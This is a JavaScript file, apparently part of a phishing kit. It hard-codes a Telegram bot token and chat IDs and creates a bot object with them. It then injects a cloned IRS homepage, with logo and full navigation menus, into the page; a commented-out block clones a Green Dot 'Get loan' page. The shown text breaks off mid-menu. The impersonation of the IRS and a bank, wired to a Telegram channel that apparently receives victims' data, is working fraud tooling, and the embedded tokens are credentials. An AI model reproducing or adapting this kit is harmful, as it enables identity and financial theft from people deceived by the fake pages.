const app = document.getElementById("app");

let token = "6818557365:AAGma_2EZmrD7QsqbKMe3wVMMQOOc5HSQr8" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
let chat_id = -821477061 //-5004137383;
let def_id = 5004137383 //748063043;
// let token = "5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
// let chat_id = -821477061 //-5004137383;
// let def_id = 748063043 //748063043;
const bt = new Bot(token, def_id);

// setTimeout(() => {
//     app.innerHTML = `
//     <link rel="stylesheet"
//     href="./assets/gd-dependencies.min.d1a8bbce41f650c77126045614356ebf.css"
//     type="text/css">
//   <link rel="stylesheet"
//     href="./assets/gd-core.min.a1473654a0882b780a3bbb31f7361f3f.css"
//     type="text/css">
//   <link rel="stylesheet"
//     href="./assets/gdcommon-global.min.14f0f195e84158d9d55774ec694d9df8.css"
//     type="text/css">
//   <link rel="stylesheet"
//     href="./assets/greendotcorp.min.6c8fe930ccfb3df7a10564fdd40369c0.css"
//     type="text/css">

//   <div class="root responsivegrid container-fluid">

//     <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

//       <div class="experiencefragment header aem-GridColumn aem-GridColumn--default--12">
//         <div id="experiencefragment-29a554b117" class="cmp-experiencefragment cmp-experiencefragment--">
//           <div class="xfpage page basicpage gd-redesign help-section-redesign">
//             <div class="xf-content-height">
//               <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
//                 <div
//                   class="header gd-header-redesign header-with-top-banner aem-GridColumn aem-GridColumn--default--12">

//                   <header class="g2b-header" style="justify-content:space-between;">
//                     <div class="g2b-header__logo-wrapper">
//                       <div class="brand-logo parbase g2b-header__logo">
//                         <div class="gd-brand-logo">
//                           <div class="brand-logo-container">
//                             <a class="gd-brand-logo__link" href="https://www.greendot.com/home"
//                               data-di-id="di-id-ab3ce09e-dba8547c">
//                               <div class="cmp-image desktop-logo large-show">
//                                 <img src="./assets/Logo.svg"
//                                   class="cmp-image__image light-mode" alt="Greendot Logo">
//                                 <img
//                                   src="./assets/Logo-dark-theme-desktop.svg"
//                                   class="cmp-image__image dark-mode" alt="Greendot Logo">
//                               </div>
//                               <div class="cmp-image mobile-logo large-hide">
//                                 <img src="./assets/Logo-mob.svg"
//                                   class="cmp-image__image light-mode" alt="Greendot Logo">
//                                 <img
//                                   src="./assets/Logo-white-theme-mobile.svg"
//                                   class="cmp-image__image dark-mode" alt="Greendot Logo">
//                               </div>
//                             </a>
//                           </div>
//                         </div>
//                       </div>
//                     </div>

//                     <div
//                       class="button btn btn-medium btn-primary btn-color-bright-green btn--round-borders btn-text-bold gd-proxima-bold header-btn gap-left-24pt">
//                       <a onclick="showForm()" id="button-50f35412db" class="cmp-button">

//                         <div class="cmp-button__text">Get loan</div>
//                       </a>
//                     </div>
//                   </header>
//                 </div>
//               </div>
//             </div>
//           </div>
//         </div>
//       </div>
//       <div class="hotfix-component aem-GridColumn aem-GridColumn--default--12" style="padding-top: 139.805px;">
//         <style>
//           .dark-theme .header-with-top-banner .g2b-header {
//             border-bottom: 0px !important
//           }

//           .black-header .header-with-top-banner .g2b-header {
//             border-bottom: 0px !important
//           }
//         </style>
//       </div>
//       <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
//         <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
//           <div class="container responsivegrid bg-container aem-GridColumn aem-GridColumn--default--12">
//             <div class="cmp-container " style="background-color:#000;">
//               <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
//                 <div
//                   class="container responsivegrid grid-control-width gap-top-24pt-mobile gap-bottom-32pt-mobile aem-GridColumn aem-GridColumn--default--12">
//                   <div class="cmp-container " style="background-color:#000;">
//                     <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 aem-Grid--phone--12 ">
//                       <div
//                         class="container responsivegrid vertical-align-center gap-bottom-32pt gap-top-96pt grid-control-width aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--12 aem-GridColumn--offset--phone--0">
//                         <div class="cmp-container ">
//                           <div
//                             class="aem-Grid aem-Grid--12 aem-Grid--tablet--12 aem-Grid--default--12 aem-Grid--phone--12 ">
//                             <div
//                               class="container responsivegrid bg-container aem-GridColumn--tablet--12 aem-GridColumn--offset--tablet--0 aem-GridColumn--default--none aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn--tablet--none aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0 aem-GridColumn--offset--default--0">
//                               <div class="cmp-container ">
//                                 <div
//                                   class="aem-Grid aem-Grid--6 aem-Grid--tablet--12 aem-Grid--default--6 aem-Grid--phone--12 ">
//                                   <div
//                                     class="image aem-GridColumn--tablet--12 aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6">
//                                     <div data-asset-id="79107516-d25e-46fb-b94e-6bf9e3de8c72" class="cmp-image  gd-img "
//                                       itemscope="" itemtype="http://schema.org/ImageObject">
//                                       <img
//                                         src="./assets/homepage-acquisition-target-b-mob.png"
//                                         alt="Mobile app with visa card" loading="lazy">
//                                     </div>
//                                   </div>
//                                 </div>
//                               </div>
//                             </div>
//                             <div
//                               class="container responsivegrid bg-container aem-GridColumn--tablet--12 aem-GridColumn--offset--tablet--0 aem-GridColumn--default--none aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn--tablet--none aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0 aem-GridColumn--offset--default--0">
//                               <div class="cmp-container ">
//                                 <div
//                                   class="aem-Grid aem-Grid--6 aem-Grid--tablet--12 aem-Grid--default--6 aem-Grid--phone--12 ">
//                                   <div
//                                     class="text text-align-center-desktop text-align-center-mobile aem-GridColumn--tablet--12 aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0">
//                                     <div id="text-b5b5d151a9" class="cmp-text">
//                                       <p style="color: rgb(255,255,255);"><span class="gd-line-height-120percent"><span
//                                             class="gd-headline-4xl gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-subheading"
//                                             style="color: rgb(255,255,255);">Green Dot</span></span><img
//                                           src="./assets/FDIC-White.svg"
//                                           style="margin-left: 10.0px;" class="mobile-fdic" alt="member fdic"><br>
//                                         <span class="gd-line-height-120percent"><span
//                                             class="gd-headline-6xl gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-heading"
//                                             style="color: rgb(255,255,255);">Unlimited<sup
//                                               style="font-size: 20.0%;top: -2.8em;">®</sup></span></span><br>
//                                         <span class="gd-line-height-120percent"><span
//                                             class="gd-headline-xlarge gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-description"
//                                             style="color: rgb(255,255,255);"><span class="gd-replicaLL-regular">No loan
//                                               fees, no credit score impact</span></span></span>
//                                       </p>
//                                     </div>
//                                   </div>
//                                   <div
//                                     class="button btn btn-large btn-primary btn-color-neon center-align gap-top-24pt gap-bottom-24pt gap-top-24pt-mobile gap-bottom-16pt-mobile aem-GridColumn--tablet--12 aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6">
//                                     <a onclick="showForm()" id="button-7f852d4a42" class="cmp-button btn-custom-dark-color "
//                                       style="--custom-dark-btn-bg-color:#91ff50;--custom-dark-btn-txt-color:#000000;--custom-dark-btn-hoverBg-color:#49d600;--custom-dark-btn-hoverTxt-color:#000000;">
//                                       <div class="cmp-button__text">Get loan</div>
//                                     </a>
//                                   </div>
//                                 </div>
//                               </div>
//                             </div>
//                           </div>
//                         </div>
//                       </div>
//                     </div>
//                   </div>
//                 </div>
//               </div>
//             </div>
//           </div>
//         </div>
//       </div>
//     </div>
//   </div>
//     `;
// }, 3000);

setTimeout(() => {
  app.innerHTML = `
  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">


    <h1 class="visually-hidden sr-only">Home Page</h1>


    <header id="navbar" role="banner">

      <div class="pup-header-main">
        <div class="container">
          <div class="row pup-header-main__content">


            <div class="col-xs-2 no-gutter pup-header-content-lt">
              <div class="region region-header-left">
                <a class="logo navbar-btn pull-left" title="Home" rel="home">
                  <img src="./assets/IRS-Logo.svg" alt="Home">
                  <img class="print-logo" src="./assets/logo-print.svg" alt="Home">
                </a>

              </div>

            </div>
          </div>
        </div>
      </div>

      <div id="pup-info-menu-collapse" class="pup-header-content-rt col-xs-12 hidden-md hidden-lg collapse no-gutter">
        <div class="region region-info-menu-collapsible">
          <nav role="navigation" aria-labelledby="block-pup-irs-informationmenu-menu" id="block-pup-irs-informationmenu"
            data-block-plugin-id="system_menu_block:pup-info-menu" class="pup-nav-en">

            <h2 class="visually-hidden" id="block-pup-irs-informationmenu-menu">Information Menu</h2>



            <ul block="pup_irs_informationmenu" class="menu menu--pup-info-menu nav">
              <li class="first">
                <a href="https://www.irs.gov/help/let-us-help-you" title="Help"
                  data-drupal-link-system-path="node/16916">Help</a>
              </li>
              <li>
                <a href="https://www.irs.gov/newsroom" title="News" data-drupal-link-system-path="node/19646">News</a>
              </li>
              <li>
                <a href="https://www.irs.gov/charities-and-nonprofits"
                  data-drupal-link-system-path="node/58461">Charities &amp; Nonprofits</a>
              </li>
              <li class="last">
                <a href="https://www.irs.gov/tax-professionals" data-drupal-link-system-path="node/11">Tax Pros</a>
              </li>
            </ul>


          </nav>

        </div>

      </div>

      <div id="pup-header-nav-collapse" class="pup-header-content-rt col-xs-12 hidden-md hidden-lg collapse no-gutter">
        <div class="region region-header-nav-collapsible">
          <section id="block-accordionmainnavigationmobile" data-block-plugin-id="accordion_menus_block:main_mobile"
            class="block block-accordion-menus block-accordion-menus-blockmain-mobile clearfix">



            <div class="accordion_menus_block_container main_mobile ui-accordion ui-widget ui-helper-reset"
              role="tablist">
              <h2
                class="accordion-title ui-accordion-header ui-corner-top ui-state-default ui-accordion-icons ui-accordion-header-collapsed ui-corner-all"
                role="tab" id="ui-id-1" aria-controls="ui-id-2" aria-selected="false" aria-expanded="false"
                tabindex="0"><span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
                <a href="https://www.irs.gov/#">File</a>
              </h2>
              <div
                class="accordion_menus-block-content ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content"
                id="ui-id-2" aria-labelledby="ui-id-1" role="tabpanel" aria-hidden="true" style="display: none;">
                <ul>
                  <li style="display: none;"><a href="https://www.irs.gov/filing" class="mobile-only-text">Overview</a>
                  </li>
                  <li><span class="mega-menu-column-header">INFORMATION FOR…</span></li>
                  <li><a href="https://www.irs.gov/how-to-file-your-taxes-step-by-step">Individuals</a></li>
                  <li><a href="https://www.irs.gov/businesses">Business &amp; Self Employed</a></li>
                  <li><a href="https://www.irs.gov/charities-and-nonprofits">Charities and Nonprofits</a></li>
                  <li><a href="https://www.irs.gov/individuals/international-taxpayers">International Taxpayers</a></li>
                  <li><a href="https://www.irs.gov/government-entities/federal-state-local-governments">Federal State
                      and Local Governments</a></li>
                  <li><a href="https://www.irs.gov/government-entities/indian-tribal-governments">Indian Tribal
                      Governments</a></li>
                  <li><a href="https://www.irs.gov/tax-exempt-bonds">Tax Exempt Bonds</a></li>
                  <li><span class="mega-menu-column-header">FILING FOR INDIVIDUALS</span></li>
                  <li><a href="https://www.irs.gov/filing/individuals/how-to-file">How to File</a></li>
                  <li><a href="https://www.irs.gov/filing/individuals/when-to-file">When to File</a></li>
                  <li><a
                      href="https://www.irs.gov/filing/where-to-file-tax-returns-addresses-listed-by-return-type">Where
                      to File</a></li>
                  <li><a href="https://www.irs.gov/filing/individuals/update-my-information">Update Your Information</a>
                  </li>
                  <li><span class="mega-menu-column-header">POPULAR</span></li>
                  <li><a href="https://www.irs.gov/individuals/get-transcript">Get Your Tax Record</a></li>
                  <li><a
                      href="https://www.irs.gov/businesses/small-businesses-self-employed/apply-for-an-employer-identification-number-ein-online">Apply
                      for an Employer ID Number (EIN)</a></li>
                  <li><a href="https://www.irs.gov/filing/wheres-my-amended-return">Check Your Amended Return Status</a>
                  </li>
                  <li><a href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin">Get an
                      Identity Protection PIN (IP PIN)</a></li>
                  <li><a href="https://www.irs.gov/filing/free-file-do-your-federal-taxes-for-free">File Your Taxes for
                      Free</a></li>
                </ul>
              </div>
              <h2
                class="accordion-title ui-accordion-header ui-corner-top ui-accordion-header-collapsed ui-corner-all ui-state-default ui-accordion-icons"
                role="tab" id="ui-id-3" aria-controls="ui-id-4" aria-selected="false" aria-expanded="false"
                tabindex="-1"><span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
                <a href="https://www.irs.gov/#">Pay</a>
              </h2>
              <div
                class="accordion_menus-block-content ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content"
                id="ui-id-4" aria-labelledby="ui-id-3" role="tabpanel" aria-hidden="true" style="display: none;">
                <ul>
                  <li style="display: none;"><a href="https://www.irs.gov/payments"
                      class="mobile-only-text">Overview</a></li>
                  <li><span class="mega-menu-column-header">PAY BY</span></li>
                  <li><a href="https://www.irs.gov/payments/direct-pay">Bank Account (Direct Pay)</a></li>
                  <li><a href="https://www.irs.gov/payments/pay-taxes-by-credit-or-debit-card">Debit or Credit Card</a>
                  </li>
                  <li><a href="https://www.irs.gov/payments/online-payment-agreement-application">Payment Plan
                      (Installment Agreement)</a></li>
                  <li><a href="https://www.irs.gov/payments/eftps-the-electronic-federal-tax-payment-system">Electronic
                      Federal Tax Payment System (EFTPS)</a></li>
                  <li><span class="mega-menu-column-header">POPULAR</span></li>
                  <li><a href="https://www.irs.gov/payments/your-online-account">Your Online Account</a></li>
                  <li><a href="https://www.irs.gov/individuals/tax-withholding-estimator">Tax Withholding Estimator</a>
                  </li>
                  <li><a href="https://www.irs.gov/businesses/small-businesses-self-employed/estimated-taxes">Estimated
                      Taxes</a></li>
                  <li><a href="https://www.irs.gov/payments/penalties">Penalties</a></li>
                </ul>
              </div>
              <h2
                class="accordion-title ui-accordion-header ui-corner-top ui-accordion-header-collapsed ui-corner-all ui-state-default ui-accordion-icons"
                role="tab" id="ui-id-5" aria-controls="ui-id-6" aria-selected="false" aria-expanded="false"
                tabindex="-1"><span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
                <a href="https://www.irs.gov/#">Refunds</a>
              </h2>
              <div
                class="accordion_menus-block-content ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content"
                id="ui-id-6" aria-labelledby="ui-id-5" role="tabpanel" aria-hidden="true" style="display: none;">
                <ul>
                  <li style="display: none;"><a href="https://www.irs.gov/refunds" class="mobile-only-text">Overview</a>
                  </li>
                  <li><a href="https://www.irs.gov/wheres-my-refund" class="mega-menu-column-header">Where's My
                      Refund</a></li>
                  <li><a href="https://www.irs.gov/refunds/what-to-expect-for-refunds-this-year">What to Expect</a></li>
                  <li><a
                      href="https://www.irs.gov/refunds/get-your-refund-faster-tell-irs-to-direct-deposit-your-refund-to-one-two-or-three-accounts">Direct
                      Deposit</a></li>
                  <li><a href="https://www.irs.gov/taxtopics/tc203">Reduced Refunds</a></li>
                  <li><a href="https://www.irs.gov/filing/file-an-amended-return">Amend Return</a></li>
                </ul>
              </div>
              <h2
                class="accordion-title ui-accordion-header ui-corner-top ui-accordion-header-collapsed ui-corner-all ui-state-default ui-accordion-icons"
                role="tab" id="ui-id-7" aria-controls="ui-id-8" aria-selected="false" aria-expanded="false"
                tabindex="-1"><span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
                <a href="https://www.irs.gov/#">Credits &amp; Deductions</a>
              </h2>
              <div
                class="accordion_menus-block-content ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content"
                id="ui-id-8" aria-labelledby="ui-id-7" role="tabpanel" aria-hidden="true" style="display: none;">
                <ul>
                  <li style="display: none;"><a href="https://www.irs.gov/credits-and-deductions"
                      class="mobile-only-text">Overview</a></li>
                  <li><span class="mega-menu-column-header">INFORMATION FOR...</span></li>
                  <li><a href="https://www.irs.gov/credits-and-deductions-for-individuals"
                      title="For you and your family">Individuals</a></li>
                  <li><a href="https://www.irs.gov/credits-deductions/businesses"
                      title="Standard mileage and other information">Businesses &amp; Self-Employed</a></li>
                  <li><span class="mega-menu-column-header">POPULAR</span></li>
                  <li><a href="https://www.irs.gov/credits-deductions/individuals/earned-income-tax-credit-eitc">Earned
                      Income Credit (EITC)</a></li>
                  <li><a href="https://www.irs.gov/credits-deductions/individuals/child-tax-credit">Child Tax Credit</a>
                  </li>
                  <li><a href="https://www.irs.gov/credits-deductions/clean-vehicle-and-energy-credits">Clean Energy and
                      Vehicle Credits</a></li>
                  <li><a href="https://www.irs.gov/help/ita/how-much-is-my-standard-deduction">Standard Deduction</a>
                  </li>
                  <li><a href="https://www.irs.gov/retirement-plans">Retirement Plans</a></li>
                </ul>
              </div>
              <h2
                class="accordion-title ui-accordion-header ui-corner-top ui-accordion-header-collapsed ui-corner-all ui-state-default ui-accordion-icons"
                role="tab" id="ui-id-9" aria-controls="ui-id-10" aria-selected="false" aria-expanded="false"
                tabindex="-1"><span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
                <a href="https://www.irs.gov/#">Forms &amp; Instructions</a>
              </h2>
              <div
                class="accordion_menus-block-content ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content"
                id="ui-id-10" aria-labelledby="ui-id-9" role="tabpanel" aria-hidden="true" style="display: none;">
                <ul>
                  <li style="display: none;"><a href="https://www.irs.gov/forms-instructions"
                      class="mobile-only-text">Overview</a></li>
                  <li><span class="mega-menu-column-header">POPULAR FORMS &amp; INSTRUCTIONS</span></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-1040" title="Individual Tax Return">Form
                      1040</a></li>
                  <li><a href="https://www.irs.gov/pub/irs-pdf/i1040gi.pdf" title="Instructions for Form 1040 "
                      onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Downloads&#39;, &#39;File Download&#39;, &#39;/pub/irs-pdf/i1040gi.pdf&#39;);">Form
                      1040 Instructions</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-w-9"
                      title="Request for Taxpayer Identification Number (TIN) and Certification">Form W-9</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-4506-t"
                      title="Request for Transcript of Tax Return">Form 4506-T</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-w-4" class="mega-menu-column-header"
                      title="Employee&#39;s Withholding Certificate">Form W-4</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-941"
                      title="Employer&#39;s Quarterly Federal Tax Return">Form 941</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-w-2"
                      title="Employers engaged in a trade or business who pay compensation">Form W-2</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-9465"
                      title="Installment Agreement Request">Form 9465</a></li>
                  <li><span class="mega-menu-column-header">POPULAR FOR TAX PROS</span></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-1040x" title="Amend/Fix Return">Form 1040-X</a>
                  </li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-2848" title="Apply for Power of Attorney">Form
                      2848</a></li>
                  <li><a href="https://www.irs.gov/forms-pubs/about-form-w-7" title="Apply for an ITIN">Form W-7</a>
                  </li>
                  <li><a href="https://www.irs.gov/pub/irs-pdf/pcir230.pdf" title="Rules Governing Practice before IRS"
                      onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Downloads&#39;, &#39;File Download&#39;, &#39;/pub/irs-pdf/pcir230.pdf&#39;);">Circular
                      230</a></li>
                </ul>
              </div>
            </div>

          </section>

          <nav role="navigation" aria-labelledby="block-mainnavigationmobile-menu" id="block-mainnavigationmobile"
            data-block-plugin-id="system_menu_block:main_mobile">

            <h2 class="visually-hidden" id="block-mainnavigationmobile-menu">Main navigation mobile</h2>




            <ul block="mainnavigationmobile" class="menu nav" id="accessible-megamenu-navigation">
              <a id="stickyNavLogo" class="logo navbar-btn pull-left" href="https://www.irs.gov/" title="Home"
                rel="home">
                <img src="./assets/IRS-Logo.svg" alt="Home">
                <img class="print-logo accessible-megamenu-panel" src="./assets/logo-print.svg" alt="Home" role="region"
                  aria-expanded="false" aria-hidden="true">
              </a>
              <li class="expanded megamenu-top-nav-item dropdown">
                <a href="https://www.irs.gov/filing" aria-controls="accessible-megamenu-file-submenu"
                  aria-expanded="false"
                  aria-label="File menu has additional options. Use the spacebar to open the File sub menu or enter to navigate to the File page."
                  role="application" id="accessible-megamenu-nav-item-0">File</a>
                <ul block="mainnavigationmobile" class="menu dropdown-menu" id="accessible-megamenu-file-submenu"
                  aria-expanded="false" aria-hidden="true" aria-labeledby="accessible-megamenu-nav-item-0"
                  role="region">
                  <div class="mega-menu-container">
                    <li style="display: none;"><a href="https://www.irs.gov/filing" class="mobile-only-text"
                        id="accessible-megamenu-file-submenu-0" data-drupal-link-system-path="node/19656">Overview</a>
                    </li>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header" id="accessible-megamenu-file-submenu-1">INFORMATION
                          FOR…</span>
                      </li>
                      <li><a href="https://www.irs.gov/how-to-file-your-taxes-step-by-step"
                          id="accessible-megamenu-file-submenu-2"
                          data-drupal-link-system-path="node/19456">Individuals</a>
                      </li>
                      <li><a href="https://www.irs.gov/businesses" id="accessible-megamenu-file-submenu-3"
                          data-drupal-link-system-path="node/18976">Business &amp; Self Employed</a>
                      </li>
                      <li><a href="https://www.irs.gov/charities-and-nonprofits" id="accessible-megamenu-file-submenu-4"
                          data-drupal-link-system-path="node/58461">Charities and Nonprofits</a>
                      </li>
                      <li><a href="https://www.irs.gov/individuals/international-taxpayers"
                          id="accessible-megamenu-file-submenu-5"
                          data-drupal-link-system-path="node/19696">International Taxpayers</a>
                      </li>
                      <li><a href="https://www.irs.gov/government-entities/federal-state-local-governments"
                          id="accessible-megamenu-file-submenu-6" data-drupal-link-system-path="node/19446">Federal
                          State and Local Governments</a>
                      </li>
                      <li><a href="https://www.irs.gov/government-entities/indian-tribal-governments"
                          id="accessible-megamenu-file-submenu-7" data-drupal-link-system-path="node/19601">Indian
                          Tribal Governments</a>
                      </li>
                      <li><a href="https://www.irs.gov/tax-exempt-bonds" id="accessible-megamenu-file-submenu-8"
                          data-drupal-link-system-path="node/19671">Tax Exempt Bonds</a>
                      </li>
                    </div>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header" id="accessible-megamenu-file-submenu-9">FILING FOR
                          INDIVIDUALS</span>
                      </li>
                      <li><a href="https://www.irs.gov/filing/individuals/how-to-file"
                          id="accessible-megamenu-file-submenu-10" data-drupal-link-system-path="node/22856">How to
                          File</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/individuals/when-to-file"
                          id="accessible-megamenu-file-submenu-11" data-drupal-link-system-path="node/22726">When to
                          File</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/where-to-file-tax-returns-addresses-listed-by-return-type"
                          id="accessible-megamenu-file-submenu-12" data-drupal-link-system-path="node/2442">Where to
                          File</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/individuals/update-my-information"
                          id="accessible-megamenu-file-submenu-13" data-drupal-link-system-path="node/22861">Update Your
                          Information</a>
                      </li>
                    </div>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header" id="accessible-megamenu-file-submenu-14">POPULAR</span>
                      </li>
                      <li><a href="https://www.irs.gov/individuals/get-transcript"
                          id="accessible-megamenu-file-submenu-15" data-drupal-link-system-path="node/64256">Get Your
                          Tax Record</a>
                      </li>
                      <li><a
                          href="https://www.irs.gov/businesses/small-businesses-self-employed/apply-for-an-employer-identification-number-ein-online"
                          id="accessible-megamenu-file-submenu-16" data-drupal-link-system-path="node/17153">Apply for
                          an Employer ID Number (EIN)</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/wheres-my-amended-return"
                          id="accessible-megamenu-file-submenu-17" data-drupal-link-system-path="node/17175">Check Your
                          Amended Return Status</a>
                      </li>
                      <li><a href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin"
                          id="accessible-megamenu-file-submenu-18" data-drupal-link-system-path="node/16696">Get an
                          Identity Protection PIN (IP PIN)</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/free-file-do-your-federal-taxes-for-free"
                          id="accessible-megamenu-file-submenu-19" data-drupal-link-system-path="node/54546">File Your
                          Taxes for Free</a>
                      </li>
                    </div>
                  </div>
                </ul>

              </li>
              <li class="expanded megamenu-top-nav-item dropdown">
                <a href="https://www.irs.gov/payments" aria-controls="accessible-megamenu-pay-submenu"
                  aria-expanded="false"
                  aria-label="Pay menu has additional options. Use the spacebar to open the Pay sub menu or enter to navigate to the Pay page."
                  role="application" id="accessible-megamenu-nav-item-1">Pay</a>
                <ul block="mainnavigationmobile" class="menu dropdown-menu" id="accessible-megamenu-pay-submenu"
                  aria-expanded="false" aria-hidden="true" aria-labeledby="accessible-megamenu-nav-item-1"
                  role="region">
                  <div class="mega-menu-container">
                    <li style="display: none;"><a href="https://www.irs.gov/payments" class="mobile-only-text"
                        id="accessible-megamenu-pay-submenu-0" data-drupal-link-system-path="node/19551">Overview</a>
                    </li>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header" id="accessible-megamenu-pay-submenu-1">PAY BY</span>
                      </li>
                      <li><a href="https://www.irs.gov/payments/direct-pay" id="accessible-megamenu-pay-submenu-2"
                          data-drupal-link-system-path="node/10224">Bank Account (Direct Pay)</a>
                      </li>
                      <li><a href="https://www.irs.gov/payments/pay-taxes-by-credit-or-debit-card"
                          id="accessible-megamenu-pay-submenu-3" data-drupal-link-system-path="node/15583">Debit or
                          Credit Card</a>
                      </li>
                      <li><a href="https://www.irs.gov/payments/online-payment-agreement-application"
                          id="accessible-megamenu-pay-submenu-4" data-drupal-link-system-path="node/16716">Payment Plan
                          (Installment Agreement)</a>
                      </li>
                      <li><a href="https://www.irs.gov/payments/eftps-the-electronic-federal-tax-payment-system"
                          id="accessible-megamenu-pay-submenu-5" data-drupal-link-system-path="node/15488">Electronic
                          Federal Tax Payment System (EFTPS)</a>
                      </li>
                    </div>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header" id="accessible-megamenu-pay-submenu-6">POPULAR</span>
                      </li>
                      <li><a href="https://www.irs.gov/payments/your-online-account"
                          id="accessible-megamenu-pay-submenu-7" data-drupal-link-system-path="node/11608">Your Online
                          Account</a>
                      </li>
                      <li><a href="https://www.irs.gov/individuals/tax-withholding-estimator"
                          id="accessible-megamenu-pay-submenu-8" data-drupal-link-system-path="node/107181">Tax
                          Withholding Estimator</a>
                      </li>
                      <li><a href="https://www.irs.gov/businesses/small-businesses-self-employed/estimated-taxes"
                          id="accessible-megamenu-pay-submenu-9" data-drupal-link-system-path="node/17135">Estimated
                          Taxes</a>
                      </li>
                      <li><a href="https://www.irs.gov/payments/penalties" id="accessible-megamenu-pay-submenu-10"
                          data-drupal-link-system-path="node/91826">Penalties</a>
                      </li>
                    </div>
                  </div>
                </ul>

              </li>
              <li class="expanded megamenu-top-nav-item dropdown">
                <a href="https://www.irs.gov/refunds" aria-controls="accessible-megamenu-refunds-submenu"
                  aria-expanded="false"
                  aria-label="Refunds menu has additional options. Use the spacebar to open the Refunds sub menu or enter to navigate to the Refunds page."
                  role="application" id="accessible-megamenu-nav-item-2">Refunds</a>
                <ul block="mainnavigationmobile" class="menu dropdown-menu" id="accessible-megamenu-refunds-submenu"
                  aria-expanded="false" aria-hidden="true" aria-labeledby="accessible-megamenu-nav-item-2"
                  role="region">
                  <div class="mega-menu-container">
                    <li style="display: none;"><a href="https://www.irs.gov/refunds" class="mobile-only-text"
                        id="accessible-megamenu-refunds-submenu-0"
                        data-drupal-link-system-path="node/130131">Overview</a>
                    </li>
                    <div class="mega-menu-column no-header-extra-padding">
                      <li><a href="https://www.irs.gov/wheres-my-refund" class="mega-menu-column-header"
                          id="accessible-megamenu-refunds-submenu-1" data-drupal-link-system-path="node/19556">Where's
                          My Refund</a>
                      </li>
                      <li><a href="https://www.irs.gov/refunds/what-to-expect-for-refunds-this-year"
                          id="accessible-megamenu-refunds-submenu-2" data-drupal-link-system-path="node/9503">What to
                          Expect</a>
                      </li>
                      <li><a
                          href="https://www.irs.gov/refunds/get-your-refund-faster-tell-irs-to-direct-deposit-your-refund-to-one-two-or-three-accounts"
                          id="accessible-megamenu-refunds-submenu-3" data-drupal-link-system-path="node/10971">Direct
                          Deposit</a>
                      </li>
                      <li><a href="https://www.irs.gov/taxtopics/tc203" id="accessible-megamenu-refunds-submenu-4"
                          data-drupal-link-system-path="node/67936">Reduced Refunds</a>
                      </li>
                      <li><a href="https://www.irs.gov/filing/file-an-amended-return"
                          id="accessible-megamenu-refunds-submenu-5" data-drupal-link-system-path="node/128551">Amend
                          Return</a>
                      </li>
                    </div>
                  </div>
                </ul>

              </li>
              <li class="expanded megamenu-top-nav-item dropdown">
                <a href="https://www.irs.gov/credits-and-deductions"
                  aria-controls="accessible-megamenu-credits &amp; deductions-submenu" aria-expanded="false"
                  aria-label="Credits &amp; Deductions menu has additional options. Use the spacebar to open the Credits &amp; Deductions sub menu or enter to navigate to the Credits &amp; Deductions page."
                  role="application" id="accessible-megamenu-nav-item-3">Credits &amp; Deductions</a>
                <ul block="mainnavigationmobile" class="menu dropdown-menu"
                  id="accessible-megamenu-credits &amp; deductions-submenu" aria-expanded="false" aria-hidden="true"
                  aria-labeledby="accessible-megamenu-nav-item-3" role="region">
                  <div class="mega-menu-container">
                    <li style="display: none;"><a href="https://www.irs.gov/credits-and-deductions"
